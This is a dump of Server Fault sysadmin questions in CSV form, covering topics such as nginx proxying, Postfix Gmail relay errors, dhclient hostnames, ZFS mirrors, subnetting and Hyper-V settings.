<p>I've read many discussions about it and what I understand is that semantically, according to FHS, websites should be kept in <code>/srv</code> directory. What I do not understand is why Apache is using <code>/var</code> as default directory and why still most people use it.</p>

<p>I'm perfectionist and it's really bugging me that I could have something on my server which isn't... well, <em>perfect</em> (I literally couldn't sleep tonight because of this...).</p>

<p>Basically what I want to know is if there is any <em>practical</em> difference between storing websites in <code>/var</code> and in <code>/srv</code>. I have my VPS for three days now  and before that my experience with Linux and servers was really small so there are probably things I can't even imagine now that can cause problems in future. I guess if there are so many people using <code>/var</code> there must be better reason than <em>many people do this so I will do this as well</em>.</p>
","<linux><web-hosting><fhs>","2016-04-27 16:01:18"
"985436","How a large database website is made to handle many different services?","<p>In many websites, they can offer a variety of services.</p>

<p>For example, on <a href=""https://www.ncbi.nlm.nih.gov"" rel=""nofollow noreferrer"">https://www.ncbi.nlm.nih.gov</a>, there are</p>

<ul>
<li><a href=""https://www.ncbi.nlm.nih.gov/pubmed/"" rel=""nofollow noreferrer"">https://www.ncbi.nlm.nih.gov/pubmed/</a></li>
<li><a href=""https://www.ncbi.nlm.nih.gov/geo/"" rel=""nofollow noreferrer"">https://www.ncbi.nlm.nih.gov/geo/</a></li>
<li><a href=""https://www.ncbi.nlm.nih.gov/pmc/"" rel=""nofollow noreferrer"">https://www.ncbi.nlm.nih.gov/pmc/</a></li>
</ul>

<p>...</p>

<p>The services are quite different, which should be maintained by different groups of people in an organization. The services should be hosted on different physical servers to serve a larger number of web requests although it appears to be just a single domain.</p>

<p>But I don't quite understand how this is done. How to make multiples physical servers appear to be a single domain? Could anybody let me know what is the current software technology to do this?</p>
","<domain-name-system><web-hosting>","2019-09-24 11:39:32"
"942677","Is it useful to keep virtualized and host traffic physically separated?","<p>In our old HyperV setup, I see that there's a LACP 3x aggregation for the virtual machine traffic, but for the same VLAN there's a separate cable that the host uses. Both are reachable from one another, but the LACP group has the hyperv virtual switch function enabled.</p>

<p>I wonder if there's a good reason why this was done or is it pure coincidence? I don't see any reason for doing it but it could be that I just don't know why.</p>

<p>Does this bring any advantage security/stabiltiy-wise?</p>
","<hyper-v><vlan><local-area-network>","2018-12-03 15:38:51"
"942711","Make an old server more power efficient - HP DL380 G7","<p>i recently picked on ebay an old HP DL380 G7, i think it was a great deal, lots of disk space and a very low price, for what I need, it was a great deal. </p>

<p>These are the specs:</p>

<p><strong>CPU:</strong> 2 x INTEL XEON E5530 2.40GHz 8MB QUAD CORE CPU</p>

<p><strong>RAM:</strong> 8GB </p>

<p><strong>HDD:</strong> 2 x GENERIC 600GB 15k 3.5"" SAS - 4x HP 2TB 6G 7.2K 3.5"" SAS</p>

<p><strong>RAID CONTROLLER:</strong> P410i/256MB</p>

<p><strong>PSU:</strong> 2 x 460W HOT PLUG PSU</p>

<p>It does not have to do very heavy work, it is used mostly as a storage and backup device, the cpu idle at about 3-4% but the power consumption is very high. The ILO report 150W, even a power meter report 150W (wow, i didn't expect that to be so accurate). My PC that is much powerfull idle at about 60W. </p>

<p>So what is it using so much power? What i should change for better power consumption (CPU, PSU ecc). </p>

<p>Maybe it's normal that servers use so much power? (i don't think so), are maybe the 6 disk that use so much power?</p>

<p>Here there is the screenshot of the power meter page:
<a href=""https://i.sstatic.net/oPHWn.jpg"" rel=""nofollow noreferrer"">Power Meter Screen</a></p>
","<hp><electrical-power>","2018-12-03 18:55:53"
"773516","Is there any latest release or other option to use LVS load balancing?","<p>i checked the official linux virtual server website and they havent updated or discontinued since 2014.So, i cant find documentations for 4.5.X kernels. Is squid or HA proxy better alternative to LVS TUN/DR and APACHE mod_proxy? IS there any other better solution to use open source layer 4 or 7 techniques to load balance a statefull application? Not talking about DNS RR</p>
","<linux><web-server><load-balancing><lvs>","2016-04-28 09:10:33"
"985650","Is running a script a process?","<p>I run <code>./install.sh</code> and I tried to <a href=""https://serverfault.com/questions/34750/is-it-possible-to-detach-a-process-from-its-terminal-or-i-should-have-used-s/34767#34767"">background</a> it to be able to close the ssh session. </p>

<p>But after running <code>bg</code> the process is again outputting to the terminal. </p>

<p>Also, I don't see anything with <code>jobs</code>.</p>

<p>And <code>top</code> shows several instances of <code>cc1plus</code> so I am not even sure if running a script actually counts as a process? Maybe it is starting several processes in the process of beeing processed...</p>
","<bash><scripting><top>","2019-09-25 20:22:20"
"985669","How do I get Nginx to redirect external traffic requests to a specific port on the 127.0.0.1 IP address of my Linux server?","<p>I am using RHEL 8.x.  I have a web UI service listening on port 9200 of the 127.0.0.1 IP address.  I have installed Nginx.  I want Nginx to redirect web traffic to 127.0.0.1:9200.  </p>

<p>From the back-end I ran this:  curl <a href=""http://127.0.0.1:9200"" rel=""nofollow noreferrer"">http://127.0.0.1:9200</a></p>

<p>It showed me what I expected.</p>

<p>From the front-end (via a web browser on my workstation) I can go to <a href=""http://123.123.123.123"" rel=""nofollow noreferrer"">http://123.123.123.123</a> and see the default ""Welcome to nginx..."" web page.</p>

<p>I would expect after following a variety of different directions on configuring nginx.conf and restarting the nginx service would work for me.  It is merely showing the default ""Welcome to nginx"" page.  I want it to redirect traffic to a specific port on my Linux server.</p>

<p>I have tried variations of the server block in nginx.conf to be like this:</p>

<p>server {
    return 301 <a href=""http://127.0.0.1:9200"" rel=""nofollow noreferrer"">http://127.0.0.1:9200</a>;
}</p>

<p>Or like this:</p>

<p>server {
    listen 80;
    listen [::]:80;
    return 301 <a href=""http://127.0.0.1:9200"" rel=""nofollow noreferrer"">http://127.0.0.1:9200</a>;
}</p>

<p>I tried modifying the location stanza and using proxy_pass.  I restart the Nginx server each time, but nothing seems to work.  How do I get Nginx to direct web traffic to the localhost over a specific port and bypass the default nginx web page?</p>
","<nginx><redirect>","2019-09-26 02:03:59"
"773625","Where can I learn System Center Configuration Manager quickly?","<p>I've got 20 tabs open each with a hierarchical set of links that include videos, guides, and more links to more videos and guides.  It's too much.  Are there any good guides that one can learn some essentials for small businesses without getting neck deep in minutia?</p>

<p>More or less, I need to learn how to create and manage collections, deploy OS's both from winPE and remotely, create and manage advertisements, create and manage windows images, and possibly push updates out to applications.</p>

<p>Switching to another system management is not an option.  I don't mind learning the ins and outs, I just want a workable knowledge set first, a bigger picture practical vocation level training.  </p>

<p>TIA</p>
","<sccm-2012>","2016-04-28 15:01:46"
"865684","How are VPS connected directly to WAN?","<p>How is it that a VPS can be connected to WAN (Wide area network) without port forwarding?</p>
","<linux><vps><wide-area-network>","2017-07-28 12:57:06"
"985795","How to push code in GitHub bare repo with private / public keys","<p>I have a server where I have a bare repo with a node.js application. I pushed the code without the node_modules and installed them directly on the Server. Heres my problem: The changes (node_modules) on the server now need to be pushed to the repo in order to make the app work. The problem, however, ist that I don't have the private and public keys that I used on my laptop on the server.</p>

<p>The Files to run the server are in a directory called webbapp, which then includes a directory called website.git (see below), where the bare repo is located.</p>

<p>When I push from the work-tree into the repo it gives me this error message:</p>

<pre><code>/opt/bitnami/apps/webapp/website.git$ git --work-tree=/opt/bitnami/apps/webapp/ push origin master
/usr/bin/ssh: /opt/bitnami/common/lib/libcrypto.so.1.0.0: no version information available (required by /usr/bin/ssh)
/usr/bin/ssh: /opt/bitnami/common/lib/libcrypto.so.1.0.0: no version information available (required by /usr/bin/ssh)
Permission denied (publickey).
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
</code></pre>

<p>I used <a href=""https://medium.com/@molp/deploy-node-js-server-to-aws-lightsail-vps-fd7e67f07b14"" rel=""nofollow noreferrer"">this</a> as a giude and got stuck after restarting the apache server. <br>
Thanks for the help.</p>
","<git><node.js><ssh-keys><amazon-lightsail>","2019-09-26 19:57:51"
"773684","Can I use Emulex fibre channel ports to set up a network between my servers?","<p>I recently got my hands on a couple of old Fujitsu servers, all of which contain two PCIe fibre channel cards (Emulex ones). I also own a fibre channel switch. Is it possible to use the FC ports as networking interfaces to communicate via TCP/UDP or is FC solely intended for the SCSI protocol?</p>
","<fibre-channel>","2016-04-28 17:48:25"
"985825","Windows 2019 server image creation with driver injection","<p>I need to create a vim file win2019server image for server deployments and I'd like to know how to inject the HP drivers to the image in the easiest way and which drivers I should inject? Does HP has some driver package that can put into an image that contains all server models driver?</p>

<p>Appreciate all help</p>

<p>Thank you</p>
","<hp><deployment><drivers><windows-server-2019>","2019-09-27 02:52:54"
"942953","Can ZFS mirror a single disk pool automatically?","<p>I'm getting ready to add another server to my home network.  I currently have one storage drive for it.  I want to add another one to mirror the first drive, but can't purchase the second drive for a couple of weeks to a month. I want to use ZFS on the mirrored storage drives.  Can I start copying data to my single storage drive, later add the second drive, and have ZFS copy the first drive's data to the second drive in a mirror?</p>
","<raid><zfs><raid1><mirror>","2018-12-05 08:15:46"
"773809","POSTFIX:Must issue a STARTTLS command first. Email not being send from commandline ubuntu","<p>I am trying to send email from the command line from my ubuntu server. So I started configuring the postfix onto my local machine rather than on server. So basically these are steps which I followed: </p>

<pre><code>sudo apt-get install postfix mailutils libsasl2-2 ca-certificates libsasl2-modules
</code></pre>

<p><strong><code>sudo vim /etc/postfix/main.cf</code></strong></p>

<p>Added below lines into the file:</p>

<pre><code>relayhost = [smtp.gmail.com]:587
smtp_sasl_auth_enable = yes
smtp_sasl_password_maps = hash:/etc/postfix/sasl_passwd
smtp_sasl_security_options = noanonymous
smtp_tls_CAfile = /etc/postfix/cacert.pem
smtp_use_tls = yes
</code></pre>

<p><strong><code>sudo vim /etc/postfix/sasl_passwd</code></strong></p>

<p>Added this one line in the file <strong><code>[smtp.gmail.com]:587    USERNAME@gmail.com:PASSWORD</code></strong></p>

<p>Permissions and updated the postfix config file.</p>

<pre><code>sudo chmod 400 /etc/postfix/sasl_passwd

sudo postmap /etc/postfix/sasl_passwd
</code></pre>

<p>reload the POSTFIX : <strong><code>sudo /etc/init.d/postfix reload</code></strong></p>

<p>Then on my terminal I run this command : </p>

<p><strong><code>echo ""Test mail from postfix"" | mail -s ""Test Postfix"" you@example.com</code></strong></p>

<p>But didn't receive the mail. So I checked the log file and that is where i found the below stack trace for it:</p>

<pre><code>postfix/pickup[26530]: A62AF2E29B4: uid=1000 from=&lt;z@mylaptop&gt;
postfix/cleanup[27372]: A62AF2E29B4: message-id=&lt;20160428114754.A62AF2E29B4@mylaptop&gt;
postfix/qmgr[26529]: A62AF2E29B4: from=&lt;z@mylaptop&gt;, size=365, nrcpt=1 (queue active)
postfix/smtp[27379]: cannot load Certificate Authority data: disabling TLS support
postfix/smtp[27379]: warning: TLS library problem: error:02001002:system library:fopen:No such file or directory:bss_file.c:169:fopen('/etc/postfix/cacert.pem','r'):
postfix/smtp[27379]: warning: TLS library problem: error:2006D080:BIO routines:BIO_new_file:no such file:bss_file.c:172:
postfix/smtp[27379]: warning: TLS library problem: error:0B084002:x509 certificate routines:X509_load_cert_crl_file:system lib:by_file.c:274:
postfix/smtp[27379]: connect to smtp.gmail.com[2404:6800:4003:c02::6d]:587: Network is unreachable
postfix/smtp[27379]: A62AF2E29B4: to=&lt;xyz@gmail.com&gt;, relay=smtp.gmail.com[74.125.68.108]:587, delay=1.4, delays=0.01/0.02/1/0.34, dsn=5.7.0, status=bounced (host smtp.gmail.com[74.125.68.108] said: 530  5.7.0 Must issue a STARTTLS command first. g70sm14489231pfb.7 - gsmtp (in reply to MAIL FROM command))
postfix/cleanup[27372]: 5BFDF2E2B48: message-id=&lt;20160428114756.5BFDF2E2B48@mylaptop&gt;
postfix/bounce[27383]: A62AF2E29B4: sender non-delivery notification: 5BFDF2E2B48
postfix/qmgr[26529]: 5BFDF2E2B48: from=&lt;&gt;, size=2239, nrcpt=1 (queue active)
postfix/qmgr[26529]: A62AF2E29B4: removed
postfix/local[27384]: 5BFDF2E2B48: to=&lt;z@mylaptop&gt;, relay=local, delay=0.01, delays=0/0.01/0/0, dsn=2.0.0, status=sent (delivered to mailbox)
postfix/qmgr[26529]: 5BFDF2E2B48: removed
</code></pre>
","<linux><ubuntu><postfix><sendmail>","2016-04-29 10:33:40"
"985955","dhclient.conf - append to system hostname","<p>I'm running a Raspbian on a bunch of Raspberry Pis. They each have a unique hostname set in <code>/etc/hostname</code> and the dhcp client correctly registers that name with my router.</p>

<p>The problem I'm running into stems from having these Pis connected to the same network, and then same DHCP server, via ethernet <strong>and</strong> WiFi - There is a race-like condition that means the rest of the network, when using names to address these Pis, can't deterministically prefer the ethernet connections over the WiFi.</p>

<p>I'd like to make the Pis report a different hostname to the network DHCP server when obtaining a lease based on which interface they connect with. This seems to be possible in a static way by adding a lines like the following to <code>/etc/dhcp/dhclient.conf</code>.</p>

<pre><code>interface ""wlan0"" {
  send host-name ""MyHostname-1234-WiFi"";
}
</code></pre>

<p>The problem I'm looking to solve is how to define that line programmatically. Something like this:</p>

<pre><code>interface ""wlan0"" {
  send host-name ""&lt;hostname&gt;-WiFi"";
}
</code></pre>

<p>Looking into the docs for <code>dhclient.conf(5)</code>, it suggests I can use the <code>concat</code> function from <code>dhcp-eval(5)</code> but I'm not having success. I'm trying this:</p>

<pre><code>interface ""wlan0"" {
  send host-name concat(gethostname(), ""-WiFi"");
}
</code></pre>
","<dhcp><hostname><dhcp-option><dhcpcd>","2019-09-27 20:58:14"
"773883","ECONNREFUSED - Connection refused by server PROFTPD","<p>I have a problem with my server.
I installed proftpd in my server, and on filezilla its work. But sometime i have this following error </p>

<pre><code>ECONNREFUSED - Connection refused by server
</code></pre>

<p>So, i have to go on my server and restart my proftpd with this following code: </p>

<pre><code>sudo /etc/init.d/proftpd restart
 * Stopping ftp server proftpd                                           [ OK ]
 * Starting ftp server proftpd                                           [ OK ]
</code></pre>

<p>Then its work again. </p>

<p>The problem is that i have this error every week so i have to restart each time.</p>

<p>Thanks for your help.</p>
","<proftpd>","2016-04-29 16:28:42"
"773920","What incident may happen that stops a VM on Azure?","<p>We were hosting a Website and a CMS at an external supplier. They told us that they host everything on Microsoft Azure. Yesterday I saw that my website was down and contacted them. Later that day they told me that our server had a  ""virtual harddrive"" failure. And the Data newest data which was not backed up is lost.
I know that Ubuntu 14.04 OS was running on that machine. 
I also know that every storage on Azure is 3 times redundant if not more. Besides the temporary storage.
Now I assume that they either used the temp storage for any activity or the failure was not a hard drive failure.
I googled for any incidents like that in the past, but couldn't find any. Also all my own Azure machines are running happily for ages. </p>

<p>What could happen that a virtual disk failure will result in losing all my data? 
This should not be an opinion based question, meaning ""do you trust my supplier"". 
I would like to know the possible reasons for a harddrive failure on a 3 times redundant storage. Also assuming that no admin accessed Azure and stopped and killed the machine manually.</p>
","<hard-drive><virtual-machines><storage><azure><drive-failure>","2016-04-29 18:57:03"
"865768","Remote Desktop Connection over 2 Routers","<p>i got some routing problems, i recently installed a wireless router on my garage so i can have ethernet on my garage office, and id like to remotely access my computer, the setup is as follows:</p>

<p>• Default gateway Primary Router: (Modem/Router combo) coaxial input from the ISP, 192.168.0.1</p>

<p>• Second Router: Asus AC-1300 ( connected toPrimary router through ethernet cable) 192.168.50.xx</p>

<p>•  Win 10 pc (remote desktop target) connected to Second 
   Router through ethernet port</p>

<p>Win 10 pc has been configured to allow remote connections (configured firewall ports and configured a static ip), i also configured the secondary router to port forward the remote port to that pc, my question is how do i forward the port from the main router? It doesnt allow me to enter an ip above the 192.168.xx range</p>
","<remote-desktop>","2017-07-29 02:18:09"
"865851","My Apache had this error and wont start I have this error (AH00526) if I want to start apache2 in my ubuntu vps","<p>(user):/etc/apache2/conf.d# sudo bash -c '. /etc/apache2/envvars ; apache2'
AH00526: Syntax error on line 1 of /etc/apache2/conf.d/.209.159.151.121.conf.swp:
Invalid command 'b0nano', perhaps misspelled or defined by a module not included in the server configuration</p>
","<linux><ubuntu><apache-2.4>","2017-07-29 22:15:33"
"986145","Increasing FTP Server download speed through multiple FTP Servers","<p>I have developed a Freemium Software which can be downloaded.
I host the download on an Ubuntu FTP Server; in which I rented a Virtual Private Server to do this.</p>

<p>My concern is the download speeds. If 100 people are downloading at once, connection will be slowed down.</p>

<p>Is there a way for me to setup multiple FTP servers  to host same file by setting up additional VPS? I can't seem to find anywhere in google how to set this up.</p>

<p>OR </p>

<p>Is there a smarter way to achieve faster download speed?</p>
","<ubuntu><ftp><vps><sftp>","2019-09-30 05:38:10"
"986155","Ubuntu 18.04 for Production advice","<p>Currently I have a laravel project that needs <code>7.2 php version</code> which is not offered in ubuntu 16 version. So I tried to upgrade and update the ubuntu version from 16 to 18 LTS just to get the <code>php version 7.2</code>. </p>

<p>The project is for long run and also I'm afraid to adjust my laravel project just to fit in with ubuntu 16. </p>

<p>Can I have your opinions or any situations that may cause for using ubuntu 18.04 LTS as production server? </p>
","<ubuntu>","2019-09-30 06:47:57"
"865883","How can I access the localhost of linux subsystem from my Windows browser?","<p>I have a Windows 10 system. I have Linux subsystem (Bash) in the same system. I have installed apache server in linux subsystem. How can I access the localhost of linux subsystem from my Windows browser?</p>
","<windows><ubuntu><apache-2.4><bash>","2017-07-30 08:20:07"
"865918","N00b alert: Cat 6A keystones with Cat6/Cat5e wires and Cat6A wires with Cat6/Cat5e connectors","<p>So first off, I have no idea how this ish works but I got myself deep down with it.</p>

<p>I was building my new house and in the garb of moment, when I was thinking of having Ethernet connectors all over the house (41 to be exact), I got convinced to put Cat6a all over the house. I also got Cat6a metal keystone connectors all over the house.</p>

<p>I never realized that industry doesn't like/care/need Cat6a and is still lurking with Cat6 or Cat5e. I have my Cameras or other equipment which have their own old Cat cables.</p>

<p>My question is: can I use Cat6a cable in these equipment (router/consoles/video hub/etc)? or can I use Cat6 or Cat5e cable in my connectors all over the house.</p>

<p>As you might have guessed through my post, I am so confused.</p>
","<cat6><rj45>","2017-07-30 15:29:26"
"865965","Webmin users can see system information: how to disable it","<p>How to prevent Webmin users from seeing the system information, currently they are able to see system info:</p>

<p><a href=""https://i.sstatic.net/WJqv6.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/WJqv6.png"" alt=""enter image description here""></a></p>
","<webmin>","2017-07-31 04:53:36"
"986244","Could anyone please tell what the lsof mean is?","<p><a href=""https://i.sstatic.net/yqzwQ.png"" rel=""nofollow noreferrer"">please see this image</a></p>

<p>Hi, there. please check this image. 
I had a suspicious IP address and I ran the last command.
Anyone please tell what that lsof is? Did somebody run the lsof command on my server? but I've never run that command</p>
","<lsof><last>","2019-09-30 16:20:22"
"943373","Is there a Microsoft alternative to WSUS other than SCCM?","<p>WSUS 2016 ""allows"" 3rd party patches through APIs, but it is buggy. Is there another free alternative built in to say Windows Server 2019?</p>
","<wsus><windows-server-2019>","2018-12-07 20:57:01"
"866021","Is the server without GPU is good for remote desktop?","<p>I want to buy a server 4 cores Intel Xeon E3-1220 v5 (16 GB RAM) but without GPU. <br>
Is it OK to use as a remote desktop computer? <br>
I know that we need GPU to show images on the screen but I don't know on which side do we need a GPU. <br>
Do we need GPU on the server side to normaly show desktop screans via remore desktop or we need GPU on the client side? Or on both sides?</p>
","<remote-desktop><rdp><desktop><remote-desktop-gateway>","2017-07-31 10:47:43"
"774155","What is the solution for daily backup only changed files (with log) in Windows Server","<p>We are a small team and working on a project that has huge file sizes which shared from a Windows Server running machine.
After some losing important files, corrupted files and etc... we decided to make a daily backup procedure to prevent that issues.</p>

<hr>

<p>Now, What is the solution to make an automatic daily backup system to backup only changed files (with KEEPING previous files) to a San storage or external hard drive or etc...?</p>

<p>1 - What should i do?</p>

<hr>

<p>2 - And what is the best to us:</p>

<p>We have in maximum 4 TB files on server.</p>

<p>San storage disk, External Hard drive or something else?</p>

<hr>

<p>In addition, The server is working 7/24 But we don't care about server downtime, because we could make it to backup that files in night.</p>

<p>Thanks in advance.</p>
","<windows><windows-server-2008><backup><windows-server-backup>","2016-05-01 16:33:37"
"943403","404's on large request pages","<p>We just moved to a linux apache cpanel vps server. Some pages with large numbers of images are receiving many 404's per page load. Some images load while others result in a 404. different images get the errors every time. all images exist and are accessible. this was not a problem on the server we just moved from. I find in the apache error_log for each of these ""client denied by server configuration"".</p>

<p>I'm guessing there's a server setting somewhere limiting the amount of requests per period of time that will be accepted, but I can't find it anywhere.</p>

<p>Thank You, John</p>
","<linux><http-status-code-404>","2018-12-08 04:47:32"
"986328","Does Office 365 offer a floating / network licensing model?","<p>Such that only up to N licenses can be shared between 5 x N users on different computers at the same time?</p>
","<microsoft-office-365><licensing>","2019-10-01 08:29:24"
"866102","Up-to-date alternatives of rssh or scponly","<p>I need:</p>

<ul>
<li>An <strong>scp</strong> and <strong>sftp</strong> server</li>
<li>With <em>chroot</em>-ed environment</li>
<li>With non-login (ssh not allowed for scp/sftp users)</li>
</ul>

<p>Options and related issues I found:</p>

<p><strong>scponly</strong></p>

<ul>
<li>No updates since more than 6 years</li>
<li>Does one really need to recompile the whole thing to make changes in the configuration??</li>
</ul>

<p><strong>rssh</strong></p>

<ul>
<li>It is told to have plenty of security issues</li>
<li>No updates since plenty of years</li>
<li>The author himself says that ""<em>rssh is done. Period</em>""</li>
<li>Ubuntu seems to be maintaining it somehow. Unfortunately, I need it for a CentOS server</li>
</ul>

<p><strong>ssh-server</strong></p>

<ul>
<li>It does the job with sftp and the chroot, but not with sftp</li>
<li>Otherwise it seems quite OK</li>
</ul>

<p>So, I was wondering what other options might be out there, or how does this particular issue get handled by others.</p>
","<ssh><login><sftp><chroot><scp>","2017-07-31 15:56:59"
"986425","Is it possible to use a DNS server as a proxy?","<p>My mobile internet provider cuts my internet service at times before it was due, I contacted them and they did nothing about it
I noticed I could still ping hostnames, thus I can connect to the dns server, can I somehow proxy my traffic through the dns server or trick my provider into thinking i'm only using the dns while i'm using the internet ?</p>
","<internal-dns><hacking><isp><dns-server>","2019-10-01 19:31:34"
"986477","Upgrading MySQL 5.5 to 5.7 on Plesk-managed Ubuntu 14.4","<p>I'm trying to upgrade MySQL on my Plesk-managed Virtual Server (Ubuntu 14.4) from version 5.5 to 5.7.</p>

<p>On the Plesk support sites and on the Internet I found the same sequence of steps. It goes like:</p>

<pre><code>(1) wget http://dev.mysql.com/get/mysql-apt-config_XYZ_all.deb
(2) sudo dpkg -i mysql-apt-config_XYZ_all.deb
(3) sudo apt-get update
(4) sudo apt-get install mysql-server
(5) mysql_upgrade -u root -p --force
</code></pre>

<p>I've done that, however in step 4 I get the following message:</p>

<pre><code>mysql-server is already the newest version.
</code></pre>

<p>Nothing gets installed, I'm still on 5.5.</p>

<p>What am I doing wrong here? I have a whole bunch of databases for different websites - what would happen if I told Plesk to desinstall and reinstall mysql, running line (5) above after that?</p>
","<mysql><ubuntu-14.04><upgrade><plesk>","2019-10-02 08:50:35"
"943637","Email server security","<p>I am writing an email server from scratch. (For learning and also eventually replace my gmail). I have no plans to send via this server (only for receiving email). My goal is to not miss any non spam emails with max security as possible. So far What I have</p>

<ol>
<li>Listening on port 25 </li>
<li>Compulsory upgrade to STARTTLS</li>
<li>Letsencrypt tls certificate.</li>
<li>ESMTP and SMTPUTF8 enabled.</li>
<li>Server based on python aiosmptpd package</li>
</ol>

<p>Questions:</p>

<ol>
<li>Should I listen on more ports like 587, 445? If so what protocol should I use on those? no tls, STARTTLS or SMPTS(TLS over SMTP)?</li>
<li>I noticed that even when I had the wrong ssl certificate, gmail did deliver the mail. Does that mean any self signed certificate should be good enough or some providers do verify validity of the certificate?</li>
<li>Are there any popular senders that don't use STARTLS whose emails that I will miss?</li>
</ol>
","<security><email-server>","2018-12-10 12:28:04"
"866281","Determine if PowerShell script has been run from the desktop or command line","<p>Windows Explorer (desktop) has the ability to run a PowerShell script by right-clicking and selecting ""Run with PowerShell"". However, as the window is closed when the script has finished, any messages are lost. So one could stick a ""Press any key"" at the end. However, that would be very annoying when run from the PowerShell command prompt.</p>

<p>Is there a way for PowerShell to determine where it was run from? Specifically, the desktop?</p>
","<powershell>","2017-08-01 13:24:55"
"774398","AWS - How to limit outward traffic amount?","<p>I want to exploit the AWS free tier to learn and do some personal projects. However what worries me is the bandwidth limitation. Specifically, the <a href=""https://aws.amazon.com/free/faqs/"" rel=""nofollow noreferrer"">AWS free tier FAQ</a> states that ""15 GB of bandwidth out aggregated across all AWS services"". Now, it is very unlikely that my intended use will reach this limit, however shit happens and who knows if my website gets mentioned on Reddit or something and suddenly I have a $500 dent in my wallet due to bandwidth. Or maybe someone decides it would be funny to DDoS my instance. Or who knows what.</p>

<p>What I would want to do is create some kind of killswitch. Basically when the amount of bandwidth used gets to something like 14GB, murder everything that uses bandwidth and keep it that way until I manually start it back up again.</p>

<p>Any ideas on how to achieve this?</p>
","<amazon-ec2><amazon-web-services><bandwidth><traffic>","2016-05-02 20:08:54"
"943700","AD PDC and SDC domain","<p>We have PDC and SDC on our network.
I need clarification if our PDC server fail due to server fault, how to make SDC as acting PDC. What is the purpose of two DC's on same network. If PDC fail SDC will not act as PDC automatically. Pls clarify me i am new to DC's applicaiton.</p>
","<domain-name-system><active-directory><domain-controller><subdomain>","2018-12-10 19:00:03"
"866311","kill not killing all processes on ubuntu16","<p>I used to use the following command line code to kill all processes</p>

<pre><code>kill `ps -ef| grep -i selenium | grep -v grep| awk '{print $2}'`
</code></pre>

<p>but that does not work in ubuntu16</p>

<p>can someone pls help?</p>
","<bash><ubuntu-16.04>","2017-08-01 16:14:41"
"943727","benefit of SAS controller over typical SATA","<p>as a home user who uses Windows 10 Home Edition more than 90% of the time with a GTX970 and playing steam games what practical benefit would an economical SAS controller provide if any?</p>

<p><em>yes, I would reinstall win10 on a new SAS SSD</em></p>

<p>I am planning on rebuilding / modding my existing home pc (Asrock Extreme4) to be more work at home friendly and I want to support SAS, mainly 2.5"" SAS SSD's and maybe 3.5"" SAS HDD's if I can find trayless docks I like to make use of disks without having to open up pc case and without having to touch a screwdriver... I do a lot of linux stuff which will be on a separate disk, preferably an SSD and while usually SATA I want to be able to accommodate SAS.</p>
","<sas><sata>","2018-12-10 21:06:11"
"866319","Self-signed ssl certificate doesn't work on mac OS Sierra","<p>I been trying all day long to get <strong>https</strong> work on my local website using self-signed ssl certificate.</p>

<p>I was following all the necessary instructions:</p>

<ol>
<li>Generated .crt and .key files following the guide on <a href=""https://devcenter.heroku.com/articles/ssl-certificate-self"" rel=""nofollow noreferrer"">https://devcenter.heroku.com/articles/ssl-certificate-self</a></li>
<li><p>Configured nginx to use ssl </p>

<pre><code>listen 443;
ssl on;
ssl_certificate /usr/local/etc/nginx/ssl/server.crt;
ssl_certificate_key /usr/local/etc/nginx/ssl/server.key;
</code></pre></li>
<li>Added generated certificate into mac's keychain and checked it as 'Always trust'</li>
</ol>

<p>But it didn't make https work and I keep getting Chrome's (or other browser's) ""<strong>Your connection is not private</strong>""</p>

<p>mac OS Sierra 10.12.6, nginx installed via homebrew</p>

<p>What did I do wrong?</p>
","<nginx><ssl><ssl-certificate><mac>","2017-08-01 16:35:07"
"774432","Connected to router but without internet","<p>My Linux Mint 17 box is connected to a router via eth0, of which is connected to the internet.  However, my box cannot access websites or ping <code>google.com</code> etc.</p>

<p>I am sure the problem is with the DNS lookup since it is possible to ping outside IP addresses, just not their host names.</p>

<p>What is missing in my configuration?</p>

<p><strong>/etc/network/interfaces</strong></p>

<pre><code>auto lo
iface lo inet loopback

auto eth0
iface eth0 inet static
address 192.168.0.200
netmask 255.255.255.0
gateway 192.168.0.1
</code></pre>

<p><strong>ifconfig</strong></p>

<pre><code>eth0      Link encap:Ethernet  HWaddr 80:ee:73:36:eb:e4
          inet addr:192.168.0.200  Bcast:192.168.0.255  Mask:255.255.255.0
          inet6 addr: fe80::82ee:73ff:fe36:ebe4/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2388 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2583 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:313912 (313.9 KB)  TX bytes:1932766 (1.9 MB)
          Interrupt:46

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:927 errors:0 dropped:0 overruns:0 frame:0
          TX packets:927 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:73985 (73.9 KB)  TX bytes:73985 (73.9 KB)
</code></pre>
","<linux-networking><eth0><linuxmint>","2016-05-03 01:11:26"
"866347","How can I disable ""Use automatic checkpoints"" for new Hyper-V VM's on Windows 10?","<p>On Windows 10, when a new VM is created, it has ""Use automatic checkpoints"" in Settings/Checkpoints turned on by default. If I recall correctly, this was a change that the Windows team made some months ago on Windows 10 Insider builds (it doesn't happen on Server).</p>

<p>Is there a way in the registry or through PowerShell or somewhere else to turn that off so it doesn't happen to my new VM's on Windows 10?</p>

<p><a href=""https://i.sstatic.net/W9tOj.jpg"" rel=""noreferrer""><img src=""https://i.sstatic.net/W9tOj.jpg"" alt=""Hyper-V Checkpoint settings""></a></p>
","<hyper-v>","2017-08-01 18:57:22"
"986644","What information does an OpenVPN provider store about me","<p>I was wondering what information is stored about me when I connect to an OpenVPN VPN provider. For example, can the provider know my operating system? I cannot seem to find any docs about this.</p>

<p>Thanks!</p>
","<openvpn>","2019-10-03 13:19:12"
"866391","How do I determine what IP range to use given how many hosts and networks I want?","<p>I need to figure out this question, but I do not know how to go about it. I am new to subnetting, and this is a question on my Microsoft Networking Security Fundamentals assessment:</p>

<p>The IT director has asked you to set up 14 separate IP networks
that can each have up to 400 computers. What IANA private IP range should you
select?</p>

<p>a. 10.0.0.0-10.255.255.255</p>

<p>b. 172.16.0.0-172.31.255.255</p>

<p>c. 192.168.0.0-192.168.255.255</p>

<p>d. 169.254.0.0-169.254.255.255</p>

<p>The answer, I have been told, is B. But why? Couldn't both B and D fulfill the request?</p>
","<ip><subnet>","2017-08-02 00:27:43"
